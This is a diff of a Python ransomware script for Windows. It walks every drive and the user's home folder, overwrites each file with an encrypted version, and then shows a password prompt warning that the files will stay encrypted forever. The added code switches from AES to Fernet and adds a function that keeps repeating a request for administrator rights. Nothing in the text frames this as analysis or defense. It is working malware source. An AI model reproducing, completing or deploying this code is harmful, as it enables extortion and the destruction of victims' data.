@@ -1,18 +1,17 @@
-import os
+from os import walk, chdir, environ
+from os.path import join
 from ctypes import windll
 from string import ascii_uppercase
-from Crypto.Cipher import AES
-from Crypto.Protocol.KDF import PBKDF2
-from Crypto.Util.Padding import pad, unpad
 from tkinter import Tk
 from tkinter.simpledialog import askstring
+from sys import executable
+from cryptography.fernet import Fernet
 
 
-def crypt_basic(pw):
-    default_salt = b'\x90\x997\x07\x12n\\P\x94\x0f\xe9[\x97U2\xd3_\x9cP\xc2\xf6\xed\xf6\xacO\xb2\xccm\xcb\xaf[\x0f'
-    default_key = PBKDF2(pw, default_salt, dkLen=32)
-    cipher = AES.new(default_key, AES.MODE_CBC)
-    return default_salt, default_key, cipher
+def crypt_basic():
+    key = Fernet.generate_key()
+    method = Fernet(key)
+    return method
 
 
 def get_drives(mode):
@@ -23,58 +22,87 @@ def get_drives(mode):
         if bitmask & 1:
             drives.append(letter + ":")
         bitmask >>= 1
+    drives.remove("C:")
+    drives.append("C:" + environ["HOMEPATH"])
     drives.append("sportacus")
+    drives.remove("F:")
     for i in drives:
         pw += i
     if mode == 0:
-        return drives, pw
+        return pw
     elif mode == 1:
         return drives
     return drives, pw
 
 
-def encrypt(i, salt, method, mode):
+def encrypt(method):
+    s = 0
+    b = 0
+    first_counter = 1
+    second_counter = 0
     drives = get_drives(1)
+    print(drives)
     for drive in drives:
         try:
-            os.chdir(drives[drives.index(drive) + i])
-        except IndexError:
-            return True
-        for root, sub, file in os.walk(drive):
-            try:
-                for files in file:
-                    with open(os.path.join(root, files), "rb")as f:
+            print("Walked drive:\t" + drive)
+            print("Working dircetory:\t" + drives[0 + first_counter])
+            print("Counter:\t" + str(first_counter))
+            print("Second Counter:\t" + str(second_counter))
+        except:
+            pass
+        try:
+            chdir(drives[0 + first_counter])
+        except:
+            print("Erster Error")
+            if second_counter == 1:
+                print("Second Counter in True:\t" + str(second_counter))
+                return True
+            second_counter += 1
+            print("Second Counter nach erhöhung:\t" + str(second_counter))
+            chdir(drives[0])
+        for root, sub, file in walk(drive):
+            for files in file:
+                try:
+                    with open(join(root, files), "rb")as f:
                         file_bytes = f.read()
-                    with open(os.path.join(root, files), "wb")as f:
-                        f.write(salt)
-                        f.write(method.iv)
-                        f.write(method.encrypt(pad(file_bytes, AES.block_size)))
-            except:
-                pass
-            i += 1
+                    with open(join(root, files), "wb")as f:
+                        f.write(method.encrypt(file_bytes))
+                except:
+                    pass
+        first_counter += 1
 
 
-def decrypt(dkey, i):
+def decrypt(method):
+    first_counter = 1
+    second_counter = 0
+    b = 0
     drives = get_drives(1)
+    print(drives)
     for drive in drives:
         try:
-            os.chdir(drives[drives.index(drive) + i])
-        except IndexError:
-            quit()
-        for root, sub, file in os.walk(drive):
-            try:
-                for files in file:
-                    with open(os.path.join(root, files), "rb")as f:
-                        f.read(32)
-                        iv = f.read(16)
+            print("Walked drive:\t" + drive)
+            print("Working dircetory:\t" + drives[0 + first_counter])
+            print("Counter:\t" + str(first_counter))
+        except:
+            pass
+        try:
+            chdir(drives[0 + first_counter])
+        except:
+            print("Erster Error")
+            if second_counter == 1:
+                return True
+            second_counter += 1
+            chdir(drives[0])
+        for root, sub, file in walk(drive):
+            for files in file:
+                try:
+                    with open(join(root, files), "rb")as f:
                         file_bytes = f.read()
-                    method = AES.new(dkey, AES.MODE_CBC, iv=iv)
-                    original_data = unpad(method.decrypt(file_bytes), AES.block_size)
-                    with open(os.path.join(root, files), "wb")as f:
-                        f.write(original_data)
-            except:
-                pass
-            i += 1
+                    with open(join(root, files), "wb")as f:
+                        f.write(method.decrypt(file_bytes))
+                except:
+                    pass
+        first_counter += 1
 
 
 def dialog(pw):
@@ -85,16 +113,37 @@ def dialog(pw):
     while answer != pw:
         if i == 0:
             return False
-        answer = askstring(title="Enter Password", prompt="All your files have been encrypted in oder to decrypt them you have to enter the password.\nIf you close this windows your files will be encrypted forever!\n{} tries left".format(i))
+        answer = askstring(title="Enter Password",
+                           prompt="All your files have been encrypted in oder to decrypt them you have to enter the password.\nIf you close this windows your files will be encrypted forever!\n{} tries left".format(
+                               i))
         if answer is None:
             return False
         i -= 1
     return True
 
 
-drives, pwd = get_drives(0)
-salt, key, method = crypt_basic(pwd)
-while not encrypt(1, salt, method, True):
+def force_admin():
+    x = 0
+    if windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        while x != 42:
+            x = windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
+        return True
+
+
+#force_admin()  # gut machen
+pwd = get_drives(0)
+method = crypt_basic()
+print(pwd)
+
+while not encrypt(method):
     pass
+print("success")
 if dialog(pwd):
-    decrypt(key, 1)
+    while not decrypt(method):
+        pass
+
+
+
+
